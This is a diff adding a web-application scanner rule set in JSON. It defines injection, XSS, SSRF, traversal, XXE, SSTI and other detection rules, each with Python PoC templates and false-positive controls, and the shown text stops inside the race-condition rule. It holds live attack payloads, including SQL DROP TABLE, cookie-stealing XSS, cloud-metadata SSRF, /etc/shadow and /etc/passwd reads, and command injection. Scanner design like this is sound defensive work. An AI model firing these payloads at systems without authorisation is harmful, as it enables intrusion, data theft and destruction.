@@ -1,0 +1,1021 @@
+{
+  "name": "DAST Rule Set",
+  "version": "3.1",
+  "author": "Nilanjan Chowdhury",
+  "description": "Enterprise DAST rules for web application security testing \u2014 22 vulnerability detection modules with PoC generation and differential/baseline confirmation logic to reduce false positives (v3.1 adds a 'validation' block per rule; see changelog).",
+  "rules": [
+    {
+      "rule_id": "DAST-001",
+      "name": "SQL Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-89",
+      "description": "Detects SQL injection vulnerabilities by injecting payloads that attempt to manipulate SQL queries.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nprint(f\"Status: {response.status_code}\")\nif \"{indicator}\" in response.text:\n    print(\"[!] Vulnerability confirmed!\")\nelse:\n    print(\"[+] No vulnerability detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "id",
+          "payloads": [
+            "' OR '1'='1",
+            "' UNION SELECT NULL--",
+            "'; DROP TABLE users--",
+            "' AND 1=1--",
+            "' AND 1=2--"
+          ]
+        },
+        {
+          "method": "POST",
+          "parameter": "username",
+          "payloads": [
+            "admin'--",
+            "admin' OR '1'='1",
+            "admin' AND 1=1--"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "SQL syntax",
+          "mysql_fetch",
+          "ORA-",
+          "Microsoft OLE DB",
+          "PostgreSQL",
+          "SQLite"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-001_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "Boolean-based differential: compare TRUE vs FALSE conditional payloads on the same parameter; only a real backend SQL evaluation produces different response length/content between them.",
+          "true_payload": "' AND '1'='1",
+          "false_payload": "' AND '1'='2",
+          "confirm_if": "response(true_payload) != response(false_payload) AND both differ from control"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-002",
+      "name": "Cross-Site Scripting (XSS) Detection",
+      "category": "XSS",
+      "severity": "High",
+      "cwe": "CWE-79",
+      "description": "Detects reflected and stored XSS vulnerabilities by injecting script payloads.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] XSS confirmed!\")\nelse:\n    print(\"[+] No XSS detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "q",
+          "payloads": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:alert(1)",
+            "\"><script>alert(1)</script>",
+            "'><script>alert(1)</script>"
+          ]
+        },
+        {
+          "method": "POST",
+          "parameter": "comment",
+          "payloads": [
+            "<script>alert(document.cookie)</script>",
+            "<svg onload=alert(1)>",
+            "<body onload=alert(1)>"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "<script>",
+          "alert(",
+          "onerror=",
+          "onload=",
+          "javascript:"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-002_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "Confirm the payload is reflected UNENCODED in an executable HTML/JS context, not just present as escaped text (&lt;script&gt;) or inside a non-executing context (comment, attribute-safe encoding).",
+          "confirm_if": "raw '<script>' or 'onerror=' present unescaped in response, not HTML-entity-encoded"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-003",
+      "name": "Server-Side Request Forgery (SSRF) Detection",
+      "category": "SSRF",
+      "severity": "High",
+      "cwe": "CWE-918",
+      "description": "Detects SSRF vulnerabilities by attempting to access internal resources.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] SSRF confirmed!\")\nelse:\n    print(\"[+] No SSRF detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "url",
+          "payloads": [
+            "http://169.254.169.254/latest/meta-data/",
+            "http://127.0.0.1:8080/admin",
+            "http://localhost:22",
+            "file:///etc/passwd",
+            "http://192.168.1.1"
+          ]
+        },
+        {
+          "method": "POST",
+          "parameter": "webhook",
+          "payloads": [
+            "http://169.254.169.254/",
+            "http://localhost:8080/internal"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "169.254.169.254",
+          "127.0.0.1",
+          "localhost",
+          "internal",
+          "metadata"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-003_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "Blind/out-of-band confirmation preferred: use an OOB collaborator domain (e.g. Burp Collaborator / interactsh) and check for an inbound callback, rather than substring-matching 'metadata' or '127.0.0.1' which commonly appear in unrelated page content.",
+          "oob_payload_template": "http://{oob_domain}/ssrf-test",
+          "confirm_if": "inbound HTTP/DNS callback received at oob_domain"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-004",
+      "name": "Path Traversal Detection",
+      "category": "Path Traversal",
+      "severity": "High",
+      "cwe": "CWE-22",
+      "description": "Detects path traversal vulnerabilities by attempting to access sensitive files.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] Path Traversal confirmed!\")\nelse:\n    print(\"[+] No Path Traversal detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "file",
+          "payloads": [
+            "../../../../etc/passwd",
+            "../../../windows/win.ini",
+            "....//....//....//etc/passwd",
+            "../../../../etc/shadow",
+            "..\\..\\..\\..\\windows\\win.ini"
+          ]
+        },
+        {
+          "method": "GET",
+          "parameter": "path",
+          "payloads": [
+            "../../../../etc/hosts",
+            "../../../../var/log/auth.log"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "root:x:0:0",
+          "[extensions]",
+          "Administrator:",
+          "127.0.0.1",
+          "localhost"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-004_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "Require a structurally-specific marker (e.g. 'root:x:0:0:root' full passwd line format, or '[fonts]'/'[extensions]' ini section header for win.ini), not a bare substring like 'root' or 'localhost' that can appear anywhere.",
+          "confirm_if": "structured_file_signature_present"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-005",
+      "name": "Command Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-78",
+      "description": "Detects OS command injection vulnerabilities by injecting system commands.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] Command Injection confirmed!\")\nelse:\n    print(\"[+] No Command Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "host",
+          "payloads": [
+            "127.0.0.1; whoami",
+            "127.0.0.1| whoami",
+            "127.0.0.1 && whoami",
+            "127.0.0.1; id",
+            "127.0.0.1| id"
+          ]
+        },
+        {
+          "method": "POST",
+          "parameter": "ping",
+          "payloads": [
+            "8.8.8.8; ls",
+            "8.8.8.8| ls",
+            "8.8.8.8 && pwd"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "uid=",
+          "gid=",
+          "groups=",
+          "root",
+          "bin",
+          "C:\\Windows\\System32"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-005_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "Use a unique, non-dictionary echo marker instead of relying on 'root'/'bin'/'uid=' substrings, which routinely appear in unrelated content (metadata, filenames, error strings).",
+          "payload_template": "127.0.0.1; echo SSTICMDTEST_DAST-005_MARKER",
+          "confirm_if": "'SSTICMDTEST_DAST-005_MARKER' present verbatim in payload response AND absent from baseline/control"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-006",
+      "name": "XXE (XML External Entity) Detection",
+      "category": "XXE",
+      "severity": "Critical",
+      "cwe": "CWE-611",
+      "description": "Detects XML External Entity injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\ndata = {{\"{parameter}\": payload}}\n\nresponse = requests.post(target, data=data)\nif \"{indicator}\" in response.text:\n    print(\"[!] XXE confirmed!\")\nelse:\n    print(\"[+] No XXE detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "xml",
+          "payloads": [
+            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>",
+            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"http://169.254.169.254/\">]><root>&test;</root>"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "root:x:0:0",
+          "169.254.169.254",
+          "java.io.FileNotFoundException"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-006_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "Prefer OOB XXE (external DTD fetch to a collaborator) over in-band file content matching, which is prone to coincidental matches on generic content.",
+          "oob_payload_template": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{oob_domain}/xxe\">]>",
+          "confirm_if": "inbound callback received at oob_domain"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-007",
+      "name": "CSRF (Cross-Site Request Forgery) Detection",
+      "category": "CSRF",
+      "severity": "High",
+      "cwe": "CWE-352",
+      "description": "Detects missing or weak CSRF tokens in sensitive requests.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\ndata = {{\"{parameter}\": payload}}\n\nresponse = requests.post(target, data=data)\nif \"{indicator}\" in response.text:\n    print(\"[!] CSRF confirmed!\")\nelse:\n    print(\"[+] No CSRF detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "csrf_token",
+          "payloads": [
+            "missing",
+            "weak",
+            "static"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "csrf",
+          "token",
+          "_csrf"
+        ],
+        "missing_token": {
+          "check": "No CSRF token found in form or request"
+        }
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-007_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-008",
+      "name": "JWT Weakness Detection",
+      "category": "JWT",
+      "severity": "High",
+      "cwe": "CWE-327",
+      "description": "Detects weak or misconfigured JWT implementations.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\nimport jwt\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nheaders = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, headers=headers)\nif \"{indicator}\" in response.text:\n    print(\"[!] JWT Weakness confirmed!\")\nelse:\n    print(\"[+] No JWT Weakness detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "Authorization",
+          "payloads": [
+            "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.",
+            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.INVALID"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "alg: none",
+          "invalid signature",
+          "jwt"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-008_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-009",
+      "name": "Open Redirect Detection",
+      "category": "Open Redirect",
+      "severity": "Medium",
+      "cwe": "CWE-601",
+      "description": "Detects open redirect vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params, allow_redirects=False)\nif \"{indicator}\" in response.headers.get(\"Location\", \"\"):\n    print(\"[!] Open Redirect confirmed!\")\nelse:\n    print(\"[+] No Open Redirect detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "redirect",
+          "payloads": [
+            "http://evil.com",
+            "//evil.com",
+            "https://evil.com",
+            "http://localhost:8080/evil"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "Location: http://evil.com",
+          "redirected to evil.com"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-009_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-010",
+      "name": "IDOR (Insecure Direct Object Reference) Detection",
+      "category": "IDOR",
+      "severity": "High",
+      "cwe": "CWE-639",
+      "description": "Detects IDOR vulnerabilities by changing object references.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] IDOR confirmed!\")\nelse:\n    print(\"[+] No IDOR detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "id",
+          "payloads": [
+            "1",
+            "2",
+            "3",
+            "admin",
+            "1000"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "user",
+          "profile",
+          "order",
+          "invoice",
+          "document"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-010_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-011",
+      "name": "LDAP Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-90",
+      "description": "Detects LDAP injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] LDAP Injection confirmed!\")\nelse:\n    print(\"[+] No LDAP Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "user",
+          "payloads": [
+            "*",
+            "admin*",
+            "*)(&)",
+            "admin)(&",
+            ")(uid=*"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "LDAP",
+          "Search returned",
+          "Invalid DN syntax"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-011_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "The literal string 'LDAP' appearing in a response (e.g. generic error pages) is not evidence of injection. Require a TRUE/FALSE boolean differential on the LDAP filter (e.g. always-true vs always-false wildcard) with a measurable behavioral difference (result count, response length).",
+          "true_payload": "*",
+          "false_payload": "nonexistent_ldap_entry_zzz",
+          "confirm_if": "response(true_payload) != response(false_payload), both differing from control"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-012",
+      "name": "XPATH Injection Detection",
+      "category": "Injection",
+      "severity": "High",
+      "cwe": "CWE-643",
+      "description": "Detects XPATH injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] XPATH Injection confirmed!\")\nelse:\n    print(\"[+] No XPATH Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "query",
+          "payloads": [
+            "' or '1'='1",
+            "' or ''='",
+            "//*",
+            "admin' or '1'='1"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "XPATH",
+          "Invalid expression",
+          "xml"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-012_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "'xml' appearing in a response is extremely weak (matches any XML-ish content, including unrelated metadata). Require boolean differential like SQLi: true vs false XPath conditions with a measurable response difference.",
+          "true_payload": "' or '1'='1",
+          "false_payload": "' or '1'='2",
+          "confirm_if": "response(true_payload) != response(false_payload), both differing from control"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-013",
+      "name": "Host Header Injection Detection",
+      "category": "Host Injection",
+      "severity": "Medium",
+      "cwe": "CWE-644",
+      "description": "Detects Host header injection vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nheaders = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, headers=headers)\nif \"{indicator}\" in response.text:\n    print(\"[!] Host Header Injection confirmed!\")\nelse:\n    print(\"[+] No Host Header Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "Host",
+          "payloads": [
+            "evil.com",
+            "localhost:8080",
+            "127.0.0.1",
+            "attacker.com"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "evil.com",
+          "attacker.com"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-013_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-014",
+      "name": "NoSQL Injection Detection",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-943",
+      "description": "Detects NoSQL injection vulnerabilities in MongoDB, Cassandra, etc.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] NoSQL Injection confirmed!\")\nelse:\n    print(\"[+] No NoSQL Injection detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "query",
+          "payloads": [
+            "{\"$ne\": null}",
+            "{\"$gt\": \"\"}",
+            "{\"$regex\": \".*\"}",
+            "admin' || '1'=='1"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "$ne",
+          "$gt",
+          "$regex",
+          "MongoError"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-014_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "'$gt'/'$ne' appearing in error messages is not evidence of successful injection. Require boolean differential: an always-true operator vs an always-false one should return different result sets.",
+          "true_payload": "{\"$gt\": \"\"}",
+          "false_payload": "{\"$eq\": \"__zzz_nonexistent__\"}",
+          "confirm_if": "response(true_payload) != response(false_payload), both differing from control"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-015",
+      "name": "Unrestricted File Upload Detection",
+      "category": "File Upload",
+      "severity": "High",
+      "cwe": "CWE-434",
+      "description": "Detects unrestricted file upload vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nfiles = {{\"{parameter}\": (payload, \"test\")}}\n\nresponse = requests.post(target, files=files)\nif \"{indicator}\" in response.text:\n    print(\"[!] File Upload confirmed!\")\nelse:\n    print(\"[+] No File Upload detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "file",
+          "payloads": [
+            "malicious.php",
+            "shell.jsp",
+            "cmd.asp",
+            "payload.aspx",
+            "backdoor.phtml",
+            "exploit.php.jpg"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "<?php",
+          "JSP",
+          "ASP",
+          "Upload successful",
+          "File uploaded"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-015_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-016",
+      "name": "Server-Side Template Injection (SSTI)",
+      "category": "Injection",
+      "severity": "Critical",
+      "cwe": "CWE-94",
+      "description": "Detects SSTI vulnerabilities in template engines.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, params=params)\nif \"{indicator}\" in response.text:\n    print(\"[!] SSTI confirmed!\")\nelse:\n    print(\"[+] No SSTI detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "template",
+          "payloads": [
+            "{{7*7}}",
+            "${7*7}",
+            "{{config}}",
+            "{{self.__class__.__mro__[1].__subclasses__()}}",
+            "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "49",
+          "config",
+          "__class__",
+          "jinja",
+          "TemplateError"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-016_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean.",
+        "differential_check": {
+          "description": "This is the rule responsible for the ICFRE false positive. '49' alone is not evidence \u2014 it can appear as a static number anywhere in a page. Require: (1) control marker unreflected check, (2) a math-vs-string differential ({{7*7}} => 49 AND {{7*'7'}} => 7777777), (3) engine-syntax specificity \u2014 a genuine hit should only fire on the syntax matching the actual backend engine, not on Jinja2 AND Freemarker AND Velocity AND Smarty AND ERB simultaneously.",
+          "control_marker": "SSTICTRL_DAST-016_XYZ",
+          "numeric_payload": "{{7*7}}",
+          "numeric_expect": "49",
+          "string_differential_payload": "{{7*'7'}}",
+          "string_differential_expect": "7777777",
+          "confirm_if": "control_marker not reflected in baseline AND numeric_expect found in numeric_payload response AND string_differential_expect found in string_differential_payload response AND only one engine syntax family shows evaluation"
+        }
+      }
+    },
+    {
+      "rule_id": "DAST-017",
+      "name": "HTTP Request Smuggling Detection",
+      "category": "HTTP",
+      "severity": "High",
+      "cwe": "CWE-444",
+      "description": "Detects HTTP request smuggling vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\n# HTTP Request Smuggling PoC requires raw HTTP request crafting\n# Use this script as a template to craft CL.TE/TE.CL requests\nprint(\"[!] Request Smuggling detected \u2014 manual PoC required.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "POST",
+          "parameter": "Transfer-Encoding",
+          "payloads": [
+            "CL.TE",
+            "TE.CL",
+            "TE.TE"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "500",
+          "Invalid request",
+          "Bad Gateway"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-017_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-018",
+      "name": "CORS Misconfiguration Detection",
+      "category": "CORS",
+      "severity": "Medium",
+      "cwe": "CWE-942",
+      "description": "Detects CORS misconfigurations allowing unauthorized domains.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\n\ntarget = \"{target}\"\nheaders = {{\"{parameter}\": payload}}\n\nresponse = requests.get(target, headers=headers)\nif \"{indicator}\" in response.headers.get(\"Access-Control-Allow-Origin\", \"\"):\n    print(\"[!] CORS Misconfiguration confirmed!\")\nelse:\n    print(\"[+] No CORS Misconfiguration detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "Origin",
+          "payloads": [
+            "https://evil.com",
+            "http://attacker.com",
+            "null"
+          ]
+        }
+      ],
+      "detection": {
+        "response_indicators": [
+          "Access-Control-Allow-Origin: https://evil.com",
+          "Access-Control-Allow-Origin: *"
+        ]
+      },
+      "validation": {
+        "confirmation_mode": "differential",
+        "require_baseline_request": true,
+        "require_control_request": true,
+        "control_payload_template": "ZZZCTRL_DAST-018_ZZZ",
+        "confirmation_rule": "indicator_in_payload_response AND NOT indicator_in_baseline_response AND NOT indicator_in_control_response",
+        "min_confidence_to_report": "medium",
+        "notes": "Do not report as confirmed on indicator match alone. Baseline/control must be clean."
+      }
+    },
+    {
+      "rule_id": "DAST-019",
+      "name": "Race Condition Detection",
+      "category": "Race Condition",
+      "severity": "High",
+      "cwe": "CWE-362",
+      "description": "Detects race condition vulnerabilities.",
+      "poc_template": {
+        "language": "python",
+        "code": "import requests\nfrom concurrent.futures import ThreadPoolExecutor\n\ntarget = \"{target}\"\npayload = \"{payload}\"\nparams = {{\"{parameter}\": payload}}\n\ndef send_request():\n    return requests.get(target, params=params)\n\nwith ThreadPoolExecutor(max_workers=5) as executor:\n    results = list(executor.map(lambda _: send_request(), range(5)))\n\nstatuses = [r.status_code for r in results]\nif len(set(statuses)) > 1:\n    print(\"[!] Race Condition confirmed!\")\nelse:\n    print(\"[+] No Race Condition detected.\")"
+      },
+      "attack_vectors": [
+        {
+          "method": "GET",
+          "parameter": "amount",
+          "payloads": [
+            "concurrent",
+            "parallel"
+          ]
+        }
+      ],
